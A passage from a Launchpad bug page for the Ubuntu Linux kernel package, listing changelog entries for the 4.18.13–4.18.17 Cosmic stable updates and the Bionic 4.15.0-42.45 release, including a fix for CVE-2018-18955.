- net: ipmr: fix unresolved entry dumps
- net/mlx5: Take only bit 24-26 of wqe.pftype\_wq for page fault type
- net: bcmgenet: Poll internal PHY for GENETv5
- net: sched: Fix for duplicate class dump
- net/sched: cls\_api: add missing validation of netlink attributes
- net/ipv6: Allow onlink routes to have a device mismatch if it is the default
route
- sctp: fix the data size calculation in sctp\_data\_size
- sctp: not free the new asoc when sctp\_wait\_for\_connect returns err
- net/mlx5: Fix memory leak when setting fpga ipsec caps
- net/smc: fix smc\_buf\_unuse to use the lgr pointer
- mlxsw: spectrum\_switchdev: Don't ignore deletions of learned MACs
- net: bpfilter: use get\_pid\_task instead of pid\_task
- net: drop skb on failure in ip\_check\_defrag()
- net: fix pskb\_trim\_rcsum\_slow() with odd trim offset
- mlxsw: core: Fix devlink unregister flow
- sparc64: Export \_\_node\_distance.
- sparc64: Make corrupted user stacks more debuggable.
- sparc64: Make proc\_id signed.
- sparc64: Set %l4 properly on trap return after handling signals.
- sparc64: Wire up compat getpeername and getsockname.
- sparc: Fix single-pcr perf event counter management.
- sparc: Fix syscall fallback bugs in VDSO.
- sparc: Throttle perf events properly.
- net: bridge: remove ipv6 zero address check in mcast queries
- Linux 4.18.17
\* Cosmic update: 4.18.16 upstream stable release (LP: #1802100)
- soundwire: Fix duplicate stream state assignment
- soundwire: Fix incorrect exit after configuring stream
- soundwire: Fix acquiring bus lock twice during master release
- media: af9035: prevent buffer overflow on write
- spi: gpio: Fix copy-and-paste error
- batman-adv: Avoid probe ELP information leak
- batman-adv: Fix segfault when writing to throughput\_override
- batman-adv: Fix segfault when writing to sysfs elp\_interval
- batman-adv: Prevent duplicated gateway\_node entry
- batman-adv: Prevent duplicated nc\_node entry
- batman-adv: Prevent duplicated softif\_vlan entry
- batman-adv: Prevent duplicated global TT entry
- batman-adv: Prevent duplicated tvlv handler
- batman-adv: fix backbone\_gw refcount on queue\_work() failure
- batman-adv: fix hardif\_neigh refcount on queue\_work() failure
- cxgb4: fix abort\_req\_rss6 struct
- clocksource/drivers/ti-32k: Add CLOCK\_SOURCE\_SUSPEND\_NONSTOP flag for non-
am43 SoCs
- scsi: ibmvscsis: Fix a stringop-overflow warning
- scsi: ibmvscsis: Ensure partition name is properly NUL terminated
- intel\_th: pci: Add Ice Lake PCH support
- Input: atakbd - fix Atari keymap
- Input: atakbd - fix Atari CapsLock behaviour
- selftests: pmtu: properly redirect stderr to /dev/null
- net: emac: fix fixed-link setup for the RTL8363SB switch
- ravb: do not write 1 to reserved bits
- net/smc: fix non-blocking connect problem
- net/smc: fix sizeof to int comparison
- qed: Fix populating the invalid stag value in multi function mode.
- qed: Do not add VLAN 0 tag to untagged frames in multi-function mode.
- PCI: dwc: Fix scheduling while atomic issues
- RDMA/uverbs: Fix validity check for modify QP
- scsi: lpfc: Synchronize access to remoteport via rport
- drm: mali-dp: Call drm\_crtc\_vblank\_reset on device init
- scsi: ipr: System hung while dlpar adding primary ipr adapter back
- scsi: sd: don't crash the host on invalid commands
- bpf: sockmap only allow ESTABLISHED sock state
- bpf: sockmap, fix transition through disconnect without close
- bpf: test\_maps, only support ESTABLISHED socks
- net/mlx4: Use cpumask\_available for eq->affinity\_mask
- clocksource/drivers/fttmr010: Fix set\_next\_event handler
- RDMA/bnxt\_re: Fix system crash during RDMA resource initialization
- RISC-V: include linux/ftrace.h in asm-prototypes.h
- iommu/rockchip: Free irqs in shutdown handler
- pinctrl/amd: poll InterruptEnable bits in amd\_gpio\_irq\_set\_type
- powerpc/tm: Fix userspace r13 corruption
- powerpc/tm: Avoid possible userspace r1 corruption on reclaim
- powerpc/numa: Use associativity if VPHN hcall is successful
- iommu/amd: Return devid as alias for ACPI HID devices
- x86/boot: Fix kexec booting failure in the SEV bit detection code
- Revert "vfs: fix freeze protection in mnt\_want\_write\_file() for overlayfs"
- mremap: properly flush TLB before releasing the page
- ARC: build: Get rid of toolchain check
- ARC: build: Don't set CROSS\_COMPILE in arch's Makefile
- Linux 4.18.16
\* Cosmic update: 4.18.15 upstream stable release (LP: #1802082)
- bnxt\_en: Fix TX timeout during netpoll.
- bnxt\_en: free hwrm resources, if driver probe fails.
- bonding: avoid possible dead-lock
- ip6\_tunnel: be careful when accessing the inner header
- ip\_tunnel: be careful when accessing the inner header
- ipv4: fix use-after-free in ip\_cmsg\_recv\_dstaddr()
- ipv6: take rcu lock in rawv6\_send\_hdrinc()
- net: dsa: bcm\_sf2: Call setup during switch resume
- net: hns: fix for unmapping problem when SMMU is on
- net: ipv4: update fnhe\_pmtu when first hop's MTU changes
- net/ipv6: Display all addresses in output of /proc/net/if\_inet6
- netlabel: check for IPV4MASK in addrinfo\_get
- net: mvpp2: Extract the correct ethtype from the skb for tx csum offload
- net: mvpp2: fix a txq\_done race condition
- net: sched: Add policy validation for tc attributes
- net: sched: cls\_u32: fix hnode refcounting
- net: systemport: Fix wake-up interrupt race during resume
- net/usb: cancel pending work when unbinding smsc75xx
- qlcnic: fix Tx descriptor corruption on 82xx devices
- qmi\_wwan: Added support for Gemalto's Cinterion ALASxx WWAN interface
- rtnl: limit IFLA\_NUM\_TX\_QUEUES and IFLA\_NUM\_RX\_QUEUES to 4096
- sctp: update dst pmtu with the correct daddr
- team: Forbid enslaving team device to itself
- tipc: fix flow control accounting for implicit connect
- udp: Unbreak modules that rely on external \_\_skb\_recv\_udp() availability
- net: qualcomm: rmnet: Skip processing loopback packets
- net: qualcomm: rmnet: Fix incorrect allocation flag in transmit
- net: qualcomm: rmnet: Fix incorrect allocation flag in receive path
- tun: remove unused parameters
- tun: initialize napi\_mutex unconditionally
- tun: napi flags belong to tfile
- net: stmmac: Fixup the tail addr setting in xmit path
- net/packet: fix packet drop as of virtio gso
- net: dsa: bcm\_sf2: Fix unbind ordering
- net/mlx5e: Set vlan masks for all offloaded TC rules
- net: aquantia: memory corruption on jumbo frames
- net/mlx5: E-Switch, Fix out of bound access when setting vport rate
- bonding: pass link-local packets to bonding master also.
- bonding: fix warning message
- net: stmmac: Rework coalesce timer and fix multi-queue races
- nfp: avoid soft lockups under control message storm
- bnxt\_en: don't try to offload VLAN 'modify' action
- net-ethtool: ETHTOOL\_GUFO did not and should not require CAP\_NET\_ADMIN
- net: phy: phylink: fix SFP interface autodetection
- sfp: fix oops with ethtool -m
- tcp/dccp: fix lockdep issue when SYN is backlogged
- inet: make sure to grab rcu\_read\_lock before using ireq->ireq\_opt
- net: dsa: b53: Keep CPU port as tagged in all VLANs
- rtnetlink: Fail dump if target netnsid is invalid
- bnxt\_en: Fix VNIC reservations on the PF.
- net: ipv4: don't let PMTU updates increase route MTU
- net/mlx5: Check for SQ and not RQ state when modifying hairpin SQ
- bnxt\_en: Fix enables field in HWRM\_QUEUE\_COS2BW\_CFG request
- bnxt\_en: get the reduced max\_irqs by the ones used by RDMA
- net/ipv6: Remove extra call to ip6\_convert\_metrics for multipath case
- net/ipv6: stop leaking percpu memory in fib6 info
- net: mscc: fix the frame extraction into the skb
- qed: Fix shmem structure inconsistency between driver and the mfw.
- r8169: fix network stalls due to missing bit TXCFG\_AUTO\_FIFO
- r8169: set RX\_MULTI\_EN bit in RxConfig for 8168F-family chips
- vxlan: fill ttl inherit info
- ASoC: dapm: Fix NULL pointer deference on CODEC to CODEC DAIs
- ASoC: max98373: Added speaker FS gain cotnrol register to volatile.
- ASoC: rt5514: Fix the issue of the delay volume applied again
- selftests: android: move config up a level
- selftests: kselftest: Remove outdated comment
- ASoC: max98373: Added 10ms sleep after amp software reset
- ASoC: wm8804: Add ACPI support
- ASoC: sigmadsp: safeload should not have lower byte limit
- ASoC: q6routing: initialize data correctly
- selftests: add headers\_install to lib.mk
- selftests/efivarfs: add required kernel configs
- selftests: memory-hotplug: add required configs
- ASoC: rsnd: adg: care clock-frequency size
- ASoC: rsnd: don't fallback to PIO mode when -EPROBE\_DEFER
- hwmon: (nct6775) Fix access to fan pulse registers
- Fix cg\_read\_strcmp()
- ASoC: AMD: Ensure reset bit is cleared before configuring
- drm/pl111: Make sure of\_device\_id tables are NULL terminated
- Bluetooth: SMP: Fix trying to use non-existent local OOB data
- Bluetooth: Use correct tfm to generate OOB data
- Bluetooth: hci\_ldisc: Free rw\_semaphore on close
- mfd: omap-usb-host: Fix dts probe of children
- KVM: PPC: Book3S HV: Don't use compound\_order to determine host mapping size
- scsi: iscsi: target: Don't use stack buffer for scatterlist
- scsi: qla2xxx: Fix an endian bug in fcpcmd\_is\_corrupted()
- sound: enable interrupt after dma buffer initialization
- sound: don't call skl\_init\_chip() to reset intel skl soc
- bpf: btf: Fix end boundary calculation for type section
- bpf: use \_\_GFP\_COMP while allocating page
- hwmon: (nct6775) Fix virtual temperature sources for NCT6796D
- hwmon: (nct6775) Fix RPM output for fan7 on NCT6796D
- stmmac: fix valid numbers of unicast filter entries
- hwmon: (nct6775) Use different register to get fan RPM for fan7
- net: ethernet: ti: add missing GENERIC\_ALLOCATOR dependency
- net: macb: disable scatter-gather for macb on sama5d3
- ARM: dts: at91: add new compatibility string for macb on sama5d3
- PCI: hv: support reporting serial number as slot information
- clk: x86: add "ether\_clk" alias for Bay Trail / Cherry Trail
- clk: x86: Stop marking clocks as CLK\_IS\_CRITICAL
- pinctrl: cannonlake: Fix gpio base for GPP-E
- x86/kvm/lapic: always disable MMIO interface in x2APIC mode
- drm/amdgpu: Fix SDMA HQD destroy error on gfx\_v7
- drm/amdkfd: Change the control stack MTYPE from UC to NC on GFX9
- drm/amdkfd: Fix ATS capablity was not reported correctly on some APUs
- mm: slowly shrink slabs with a relatively small number of objects
- mm/vmstat.c: fix outdated vmstat\_text
- afs: Fix afs\_server struct leak
- afs: Fix clearance of reply
- MIPS: Fix CONFIG\_CMDLINE handling
- MIPS: VDSO: Always map near top of user memory
- mach64: detect the dot clock divider correctly on sparc
- vsprintf: Fix off-by-one bug in bstr\_printf() processing dereferenced
pointers
- percpu: stop leaking bitmap metadata blocks
- perf script python: Fix export-to-postgresql.py occasional failure
- perf script python: Fix export-to-sqlite.py sample columns
- s390/cio: Fix how vfio-ccw checks pinned pages
- dm cache: destroy migration\_cache if cache target registration failed
- dm: fix report zone remapping to account for partition offset
- dm linear: eliminate linear\_end\_io call if CONFIG\_DM\_ZONED disabled
- dm linear: fix linear\_end\_io conditional definition
- cgroup: Fix dom\_cgrp propagation when enabling threaded mode
- Input: xpad - add support for Xbox1 PDP Camo series gamepad
- drm/nouveau/drm/nouveau: Grab runtime PM ref in nv50\_mstc\_detect()
- mmc: block: avoid multiblock reads for the last sector in SPI mode
- pinctrl: mcp23s08: fix irq and irqchip setup order
- arm64: perf: Reject stand-alone CHAIN events for PMUv3
- mm/mmap.c: don't clobber partially overlapping VMA with MAP\_FIXED\_NOREPLACE
- mm/thp: fix call to mmu\_notifier in set\_pmd\_migration\_entry() v2
- filesystem-dax: Fix dax\_layout\_busy\_page() livelock
- mm: Preserve \_PAGE\_DEVMAP across mprotect() calls
- i2c: i2c-scmi: fix for i2c\_smbus\_write\_block\_data
- KVM: PPC: Book3S HV: Avoid crash from THP collapse during radix page fault
- Linux 4.18.15
\* Cosmic update: 4.18.14 upstream stable release (LP: #1801986)
- perf/core: Add sanity check to deal with pinned event failure
- mm: migration: fix migration of huge PMD shared pages
- mm, thp: fix mlocking THP page with migration enabled
- mm/vmstat.c: skip NR\_TLB\_REMOTE\_FLUSH\* properly
- KVM: VMX: check for existence of secondary exec controls before accessing
- blk-mq: I/O and timer unplugs are inverted in blktrace
- pstore/ram: Fix failure-path memory leak in ramoops\_init
- clocksource/drivers/timer-atmel-pit: Properly handle error cases
- fbdev/omapfb: fix omapfb\_memory\_read infoleak
- mmc: core: Fix debounce time to use microseconds
- mmc: slot-gpio: Fix debounce time to use miliseconds again
- mac80211: allocate TXQs for active monitor interfaces
- drm/amdgpu: Fix vce work queue was not cancelled when suspend
- drm: fix use-after-free read in drm\_mode\_create\_lease\_ioctl()
- x86/vdso: Fix asm constraints on vDSO syscall fallbacks
- selftests/x86: Add clock\_gettime() tests to test\_vdso
- x86/vdso: Only enable vDSO retpolines when enabled and supported
- x86/vdso: Fix vDSO syscall fallback asm constraint regression
- Revert "UBUNTU: SAUCE: PCI: Reprogram bridge prefetch registers on resume"
- PCI: Reprogram bridge prefetch registers on resume
- mac80211: fix setting IEEE80211\_KEY\_FLAG\_RX\_MGMT for AP mode keys
- PM / core: Clear the direct\_complete flag on errors
- dm mpath: fix attached\_handler\_name leak and dangling hw\_handler\_name
pointer
- dm cache metadata: ignore hints array being too small during resize
- dm cache: fix resize crash if user doesn't reload cache table
- xhci: Add missing CAS workaround for Intel Sunrise Point xHCI
- usb: xhci-mtk: resume USB3 roothub first
- USB: serial: simple: add Motorola Tetra MTP6550 id
- USB: serial: option: improve Quectel EP06 detection
- USB: serial: option: add two-endpoints device-id flag
- usb: cdc\_acm: Do not leak URB buffers
- tty: Drop tty->count on tty\_reopen() failure
- of: unittest: Disable interrupt node tests for old world MAC systems
- powerpc: Avoid code patching freed init sections
- powerpc/lib: fix book3s/32 boot failure due to code patching
- ARC: clone syscall to setp r25 as thread pointer
- f2fs: fix invalid memory access
- tipc: call start and done ops directly in \_\_tipc\_nl\_compat\_dumpit()
- ucma: fix a use-after-free in ucma\_resolve\_ip()
- ubifs: Check for name being NULL while mounting
- rds: rds\_ib\_recv\_alloc\_cache() should call alloc\_percpu\_gfp() instead
- ath10k: fix scan crash due to incorrect length calculation
- Linux 4.18.14
\* Cosmic update: 4.18.13 upstream stable release (LP: #1801931)
- rseq/selftests: fix parametrized test with -fpie
- mac80211: Run TXQ teardown code before de-registering interfaces
- mac80211\_hwsim: require at least one channel
- Btrfs: fix unexpected failure of nocow buffered writes after snapshotting
when low on space
- KVM: PPC: Book3S HV: Don't truncate HPTE index in xlate function
- cfg80211: remove division by size of sizeof(struct ieee80211\_wmm\_rule)
- btrfs: btrfs\_shrink\_device should call commit transaction at the end
- scsi: csiostor: add a check for NULL pointer after kmalloc()
- scsi: csiostor: fix incorrect port capabilities
- scsi: libata: Add missing newline at end of file
- scsi: aacraid: fix a signedness bug
- bpf, sockmap: fix potential use after free in bpf\_tcp\_close
- bpf, sockmap: fix psock refcount leak in bpf\_tcp\_recvmsg
- bpf: sockmap, decrement copied count correctly in redirect error case
- mac80211: correct use of IEEE80211\_VHT\_CAP\_RXSTBC\_X
- mac80211\_hwsim: correct use of IEEE80211\_VHT\_CAP\_RXSTBC\_X
- cfg80211: make wmm\_rule part of the reg\_rule structure
- mac80211\_hwsim: Fix possible Spectre-v1 for hwsim\_world\_regdom\_custom
- nl80211: Fix nla\_put\_u8 to u16 for NL80211\_WMMR\_TXOP
- nl80211: Pass center frequency in kHz instead of MHz
- bpf: fix several offset tests in bpf\_msg\_pull\_data
- gpio: adp5588: Fix sleep-in-atomic-context bug
- mac80211: mesh: fix HWMP sequence numbering to follow standard
- mac80211: avoid kernel panic when building AMSDU from non-linear SKB
- gpiolib: acpi: Switch to cansleep version of GPIO library call
- gpiolib-acpi: Register GpioInt ACPI event handlers from a late\_initcall
- gpio: dwapb: Fix error handling in dwapb\_gpio\_probe()
- bpf: fix msg->data/data\_end after sg shift repair in bpf\_msg\_pull\_data
- bpf: fix shift upon scatterlist ring wrap-around in bpf\_msg\_pull\_data
- bpf: fix sg shift repair start offset in bpf\_msg\_pull\_data
- tipc: switch to rhashtable iterator
- sh\_eth: Add R7S9210 support
- net: mvpp2: initialize port of\_node pointer
- tc-testing: add test-cases for numeric and invalid control action
- cfg80211: nl80211\_update\_ft\_ies() to validate NL80211\_ATTR\_IE
- mac80211: do not convert to A-MSDU if frag/subframe limited
- mac80211: always account for A-MSDU header changes
- tools/kvm\_stat: fix python3 issues
- tools/kvm\_stat: fix handling of invalid paths in debugfs provider
- tools/kvm\_stat: fix updates for dead guests
- gpio: Fix crash due to registration race
- ARC: atomics: unbork atomic\_fetch\_##op()
- Revert "blk-throttle: fix race between blkcg\_bio\_issue\_check() and
cgroup\_rmdir()"
- md/raid5-cache: disable reshape completely
- RAID10 BUG\_ON in raise\_barrier when force is true and conf->barrier is 0
- selftests: pmtu: maximum MTU for vti4 is 2^16-1-20
- selftests: pmtu: detect correct binary to ping ipv6 addresses
- ibmvnic: Include missing return code checks in reset function
- bpf: Fix bpf\_msg\_pull\_data()
- bpf: avoid misuse of psock when TCP\_ULP\_BPF collides with another ULP
- i2c: uniphier: issue STOP only for last message or I2C\_M\_STOP
- i2c: uniphier-f: issue STOP only for last message or I2C\_M\_STOP
- net: cadence: Fix a sleep-in-atomic-context bug in macb\_halt\_tx()
- fs/cifs: don't translate SFM\_SLASH (U+F026) to backslash
- mac80211: fix an off-by-one issue in A-MSDU max\_subframe computation
- cfg80211: fix a type issue in ieee80211\_chandef\_to\_operating\_class()
- mac80211: fix WMM TXOP calculation
- mac80211: fix a race between restart and CSA flows
- mac80211: Fix station bandwidth setting after channel switch
- mac80211: don't Tx a deauth frame if the AP forbade Tx
- mac80211: shorten the IBSS debug messages
- fsnotify: fix ignore mask logic in fsnotify()
- net/ibm/emac: wrong emac\_calc\_base call was used by typo
- nds32: fix logic for module
- nds32: add NULL entry to the end of\_device\_id array
- nds32: Fix empty call trace
- nds32: Fix get\_user/put\_user macro expand pointer problem
- nds32: fix build error because of wrong semicolon
- tools/vm/slabinfo.c: fix sign-compare warning
- tools/vm/page-types.c: fix "defined but not used" warning
- nds32: linker script: GCOV kernel may refers data in \_\_exit
- ceph: avoid a use-after-free in ceph\_destroy\_options()
- firmware: arm\_scmi: fix divide by zero when sustained\_perf\_level is zero
- afs: Fix cell specification to permit an empty address list
- mm: madvise(MADV\_DODUMP): allow hugetlbfs pages
- bpf: 32-bit RSH verification must truncate input before the ALU op
- netfilter: xt\_cluster: add dependency on conntrack module
- netfilter: xt\_checksum: ignore gso skbs
- HID: intel-ish-hid: Enable Sunrise Point-H ish driver
- HID: add support for Apple Magic Keyboards
- usb: gadget: fotg210-udc: Fix memory leak of fotg210->ep[i]
- HID: hid-saitek: Add device ID for RAT 7 Contagion
- scsi: iscsi: target: Set conn->sess to NULL when iscsi\_login\_set\_conn\_values
fails
- scsi: iscsi: target: Fix conn\_ops double free
- scsi: qedi: Add the CRC size within iSCSI NVM image
- perf annotate: Properly interpret indirect call
- perf evsel: Fix potential null pointer dereference in perf\_evsel\_\_new\_idx()
- perf util: Fix bad memory access in trace info.
- perf probe powerpc: Ignore SyS symbols irrespective of endianness
- perf annotate: Fix parsing aarch64 branch instructions after objdump update
- netfilter: kconfig: nat related expression depend on nftables core
- netfilter: nf\_tables: release chain in flushing set
- Revert "iio: temperature: maxim\_thermocouple: add MAX31856 part"
- iio: imu: st\_lsm6dsx: take into account ts samples in wm configuration
- RDMA/ucma: check fd type in ucma\_migrate\_id()
- riscv: Do not overwrite initrd\_start and initrd\_end
- HID: sensor-hub: Restore fixup for Lenovo ThinkPad Helix 2 sensor hub report
- usb: host: xhci-plat: Iterate over parent nodes for finding quirks
- USB: yurex: Check for truncation in yurex\_read()
- nvmet-rdma: fix possible bogus dereference under heavy load
- bnxt\_re: Fix couple of memory leaks that could lead to IOMMU call traces
- net/mlx5: Consider PCI domain in search for next dev
- dm raid: fix reshape race on small devices
- drm/nouveau: fix oops in client init failure path
- drm/nouveau/mmu: don't attempt to dereference vmm without valid instance
pointer
- drm/nouveau/TBDdevinit: don't fail when PMU/PRE\_OS is missing from VBIOS
- drm/nouveau/disp: fix DP disable race
- drm/nouveau/disp/gm200-: enforce identity-mapped SOR assignment for LVDS/eDP
panels
- dm raid: fix stripe adding reshape deadlock
- dm raid: fix rebuild of specific devices by updating superblock
- dm raid: fix RAID leg rebuild errors
- r8169: set TxConfig register after TX / RX is enabled, just like RxConfig
- fs/cifs: suppress a string overflow warning
- perf/x86/intel: Add support/quirk for the MISPREDICT bit on Knights Landing
CPUs
- sched/topology: Set correct NUMA topology type
- dm thin metadata: try to avoid ever aborting transactions
- netfilter: nfnetlink\_queue: Solve the NFQUEUE/conntrack clash for NF\_REPEAT
- netfilter: xt\_hashlimit: use s->file instead of s->private
- arch/hexagon: fix kernel/dma.c build warning
- hexagon: modify ffs() and fls() to return int
- drm/amdgpu: Fix SDMA hang in prt mode v2
- arm64: jump\_label.h: use asm\_volatile\_goto macro instead of "asm goto"
- drm/amdgpu: fix error handling in amdgpu\_cs\_user\_fence\_chunk
- r8169: Clear RTL\_FLAG\_TASK\_\*\_PENDING when clearing RTL\_FLAG\_TASK\_ENABLED
- s390/qeth: don't dump past end of unknown HW header
- cifs: read overflow in is\_valid\_oplock\_break()
- asm-generic: io: Fix ioport\_map() for !CONFIG\_GENERIC\_IOMAP &&
CONFIG\_INDIRECT\_PIO
- xen/manage: don't complain about an empty value in control/sysrq node
- xen: avoid crash in disable\_hotplug\_cpu
- xen: fix GCC warning and remove duplicate EVTCHN\_ROW/EVTCHN\_COL usage
- x86/APM: Fix build warning when PROC\_FS is not enabled
- new primitive: discard\_new\_inode()
- vfs: don't evict uninitialized inode
- ovl: set I\_CREATING on inode being created
- ovl: fix access beyond unterminated strings
- ovl: fix memory leak on unlink of indexed file
- ovl: fix format of setxattr debug
- sysfs: Do not return POSIX ACL xattrs via listxattr
- b43: fix DMA error related regression with proprietary firmware
- firmware: Fix security issue with request\_firmware\_into\_buf()
- firmware: Always initialize the fw\_priv list object
- cpufreq: qcom-kryo: Fix section annotations
- smb2: fix missing files in root share directory listing
- iommu/amd: Clear memory encryption mask from physical address
- crypto: qat - Fix KASAN stack-out-of-bounds bug in adf\_probe()
- crypto: chelsio - Fix memory corruption in DMA Mapped buffers.
- crypto: mxs-dcp - Fix wait logic on chan threads
- crypto: caam/jr - fix ablkcipher\_edesc pointer arithmetic
- gpiolib: Free the last requested descriptor
- Drivers: hv: vmbus: Use get/put\_cpu() in vmbus\_connect()
- tools: hv: fcopy: set 'error' in case an unknown operation was requested
- proc: restrict kernel stack dumps to root
- ocfs2: fix locking for res->tracking and dlm->tracking\_list
- HID: i2c-hid: disable runtime PM operations on hantick touchpad
- ixgbe: check return value of napi\_complete\_done()
- dm thin metadata: fix \_\_udivdi3 undefined on 32-bit
- Revert "drm/amd/pp: Send khz clock values to DC for smu7/8"
- Linux 4.18.13
\* Volume control not working Dell XPS 27 (7760) (LP: #1775068) // Cosmic
update: 4.18.13 upstream stable release (LP: #1801931)
- ALSA: hda/realtek - Cannot adjust speaker's volume on Dell XPS 27 7760
\* [Bionic][Cosmic] ipmi: Fix timer race with module unload (LP: #1799281)
- ipmi: Fix timer race with module unload
\* [Bionic][Cosmic] Fix to ipmi to support vendor specific messages greater
than 255 bytes (LP: #1799794)
- ipmi:ssif: Add support for multi-part transmit messages > 2 parts
\* 18.10 kernel does not appear to validate kernel module signatures correctly
(LP: #1798863) // CVE-2018-18653
- SAUCE: (efi-lockdown) module: remove support for deferring module signature
verification to IMA
\* 18.10 kernel does not appear to validate kernel module signatures correctly
(LP: #1798863)
- SAUCE: (efi-lockdown) module: trust keys from secondary keyring for module
signing
\* [Ubuntu] net/af\_iucv: fix skb leaks for HiperTransport (LP: #1800639)
- net/af\_iucv: drop inbound packets with invalid flags
- net/af\_iucv: fix skb handling on HiperTransport xmit error
\* Power consumption during s2idle is higher than long idle(sk hynix)
(LP: #1801875)
- SAUCE: pci: prevent sk hynix nvme from entering D3
- SAUCE: nvme: add quirk to not call disable function when suspending
\* NULL pointer dereference at 0000000000000020 when access
dst\_orig->ops->family in function xfrm\_lookup\_with\_ifid() (LP: #1801878)
- xfrm: Fix NULL pointer dereference when skb\_dst\_force clears the dst\_entry.
\* hns3: map tx ring to tc (LP: #1802023)
- net: hns3: Set tx ring' tc info when netdev is up
\* [Ubuntu] qeth: Fix potential array overrun in cmd/rc lookup (LP: #1800641)
- s390: qeth\_core\_mpc: Use ARRAY\_SIZE instead of reimplementing its function
- s390: qeth: Fix potential array overrun in cmd/rc lookup
\* Mellanox CX5 stops pinging with rx\_wqe\_err (mlx5\_core) (LP: #1799393)
- net/mlx5: WQ, fixes for fragmented WQ buffers API
\* Vulkan applications cause permanent memory leak with Intel GPU
(LP: #1798165)
- drm/syncobj: Don't leak fences when WAIT\_FOR\_SUBMIT is set
\* Packaging resync (LP: #1786013)
- [Package] add support for specifying the primary makefile
-- Thadeu Lima de Souza Cascardo <cascardo@canonical.com> Wed, 14 Nov 2018 11:30:22 -0200

| Changed in linux (Ubuntu Cosmic): | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2018-12-03: |  |  | [#7](/ubuntu/%2Bsource/linux/%2Bbug/1801924/comments/7) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1801924/comments/7/%2Bdownload) (3.1 KiB)

This bug was fixed in the package linux - 4.15.0-42.45

---------------

linux (4.15.0-42.45) bionic; urgency=medium

\* linux: 4.15.0-42.45 -proposed tracker (LP: [#1803592](/bugs/1803592))

\* [FEAT] Guest-dedicated Crypto Adapters (LP: [#1787405](/bugs/1787405))

    - KVM: s390: reset crypto attributes for all vcpus

    - KVM: s390: vsie: simulate VCPU SIE entry/exit

    - KVM: s390: introduce and use KVM\_REQ\_VSIE\_RESTART

    - KVM: s390: refactor crypto initialization

    - s390: vfio-ap: base implementation of VFIO AP device driver

    - s390: vfio-ap: register matrix device with VFIO mdev framework

    - s390: vfio-ap: sysfs interfaces to configure adapters

    - s390: vfio-ap: sysfs interfaces to configure domains

    - s390: vfio-ap: sysfs interfaces to configure control domains

    - s390: vfio-ap: sysfs interface to view matrix mdev matrix

    - KVM: s390: interface to clear CRYCB masks

    - s390: vfio-ap: implement mediated device open callback

    - s390: vfio-ap: implement VFIO\_DEVICE\_GET\_INFO ioctl

    - s390: vfio-ap: zeroize the AP queues

    - s390: vfio-ap: implement VFIO\_DEVICE\_RESET ioctl

    - KVM: s390: Clear Crypto Control Block when using vSIE

    - KVM: s390: vsie: Do the CRYCB validation first

    - KVM: s390: vsie: Make use of CRYCB FORMAT2 clear

    - KVM: s390: vsie: Allow CRYCB FORMAT-2

    - KVM: s390: vsie: allow CRYCB FORMAT-1

    - KVM: s390: vsie: allow CRYCB FORMAT-0

    - KVM: s390: vsie: allow guest FORMAT-0 CRYCB on host FORMAT-1

    - KVM: s390: vsie: allow guest FORMAT-1 CRYCB on host FORMAT-2

    - KVM: s390: vsie: allow guest FORMAT-0 CRYCB on host FORMAT-2

    - KVM: s390: device attrs to enable/disable AP interpretation

    - KVM: s390: CPU model support for AP virtualization

    - s390: doc: detailed specifications for AP virtualization

    - KVM: s390: fix locking for crypto setting error path

    - KVM: s390: Tracing APCB changes

    - s390: vfio-ap: setup APCB mask using KVM dedicated function

    - s390/zcrypt: Add ZAPQ inline function.

    - s390/zcrypt: Review inline assembler constraints.

    - s390/zcrypt: Integrate ap\_asm.h into include/asm/ap.h.

    - s390/zcrypt: fix ap\_instructions\_available() returncodes

    - s390/zcrypt: remove VLA usage from the AP bus

    - s390/zcrypt: Remove deprecated ioctls.

    - s390/zcrypt: Remove deprecated zcrypt proc interface.

    - s390/zcrypt: Support up to 256 crypto adapters.

    - [Config:] Enable CONFIG\_S390\_AP\_IOMMU and set CONFIG\_VFIO\_AP to module.

\* Bypass of mount visibility through userns + mount propagation (LP: [#1789161](/bugs/1789161))

    - mount: Retest MNT\_LOCKED in do\_umount

    - mount: Don't allow copying MNT\_UNBINDABLE|MNT\_LOCKED mounts

\* CVE-2018-18955: nested user namespaces with more than five extents

    incorrectly grant privileges over inode (LP: [#1801924](/bugs/1801924)) // CVE-2018-18955

    - userns: also map extents in the reverse map to kernel IDs

\* kdump fail due to an IRQ storm (LP: [#1797990](/bugs/1797990))

    - SAUCE: x86/PCI: Export find\_cap() to be used in early PCI code

    - SAUCE: x86/quirks: Add parameter to clear MSIs early on boot

    - SAUCE: x86/quirks: Scan all busses for early PCI quirks

-- Thadeu Lima de Souza Cascardo <email address hidden> Thu, 15 Nov 2018 17:01:46 ...

[Read more...](/ubuntu/%2Bsource/linux/%2Bbug/1801924/comments/7)

This bug was fixed in the package linux - 4.15.0-42.45
---------------
linux (4.15.0-42.45) bionic; urgency=medium
\* linux: 4.15.0-42.45 -proposed tracker (LP: #1803592)
\* [FEAT] Guest-dedicated Crypto Adapters (LP: #1787405)
- KVM: s390: reset crypto attributes for all vcpus
- KVM: s390: vsie: simulate VCPU SIE entry/exit
- KVM: s390: introduce and use KVM\_REQ\_VSIE\_RESTART
- KVM: s390: refactor crypto initialization
- s390: vfio-ap: base implementation of VFIO AP device driver
- s390: vfio-ap: register matrix device with VFIO mdev framework
- s390: vfio-ap: sysfs interfaces to configure adapters
- s390: vfio-ap: sysfs interfaces to configure domains
- s390: vfio-ap: sysfs interfaces to configure control domains
- s390: vfio-ap: sysfs interface to view matrix mdev matrix
- KVM: s390: interface to clear CRYCB masks
- s390: vfio-ap: implement mediated device open callback
- s390: vfio-ap: implement VFIO\_DEVICE\_GET\_INFO ioctl
- s390: vfio-ap: zeroize the AP queues
- s390: vfio-ap: implement VFIO\_DEVICE\_RESET ioctl
- KVM: s390: Clear Crypto Control Block when using vSIE
- KVM: s390: vsie: Do the CRYCB validation first
- KVM: s390: vsie: Make use of CRYCB FORMAT2 clear
- KVM: s390: vsie: Allow CRYCB FORMAT-2
- KVM: s390: vsie: allow CRYCB FORMAT-1
- KVM: s390: vsie: allow CRYCB FORMAT-0
- KVM: s390: vsie: allow guest FORMAT-0 CRYCB on host FORMAT-1
- KVM: s390: vsie: allow guest FORMAT-1 CRYCB on host FORMAT-2
- KVM: s390: vsie: allow guest FORMAT-0 CRYCB on host FORMAT-2
